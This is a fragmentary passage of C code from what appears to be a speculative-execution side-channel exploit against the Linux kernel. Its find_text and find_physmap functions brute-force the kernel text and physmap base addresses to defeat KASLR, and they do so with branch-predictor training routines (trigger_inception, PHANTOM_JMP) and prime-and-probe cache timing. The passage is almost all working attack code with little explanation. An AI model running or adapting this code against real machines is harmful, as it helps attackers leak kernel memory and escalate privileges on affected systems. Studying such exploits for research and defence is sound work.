...
uint64_t find_physmap(uint64_t text, uint64_t phys){
    ...
    for(int i = 0; i < 3; i++){
        for(uint64_t physmap_guess = 0xffff888000000000; physmap_guess <= 0xfffffe0000000000; physmap_guess += 0x40000000){
            ...
            if(trigger_inception(0x0, physmap_guess + phys - 0xc0, 0x0, PHYSMAP_ITERATIONS)){
                unset_training_addrs();
                printf("\n");
...
int64_t prime_probe_guess(uint64_t base, uint64_t guess, int set, uint64_t start, uint64_t iterations){
    uint64_t dt[2] = {0};
...
uint64_t find_text(){
    ...
    for(int i = 0; i < 3; i++){
        for(uint64_t guess = 0xffffffff81000000; guess < 0xffffffff81000000 + 495 * 0x200000; guess += 0x200000){
            ...
            set_training_addrs(guess + PHANTOM_JMP, PHANTOM_JMP_DISTANCE, guess + 0xb0a6ff, 30);

            int64_t res = 0;
            for(int r = 0; r < 1; r++){
                for(int i = 0; i < 64; i++){
                    int64_t ok = prime_probe_guess(guess, guess + (i * 0x40), i, addrs[i * WAYS], 100);
                    res += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
                }
            }
            ...
            int64_t res_1 = 0;
            for(int i = 0; i < 64; i++){
                int64_t ok = prime_probe_guess(guess, guess - 0x200000 + (i * 0x40), i, addrs[(i % 64) * WAYS], 250);
                res_1 += (ok > 0 ? 1 : (ok < 0 ? -1 : 0));
            }

            int64_t res_2 = 0;
            for(int i = 0; i < 64; i++){
                int64_t ok = prime_probe_guess(guess, guess + (i * 0x40), i, addrs[(i % 64) * WAYS], 250);
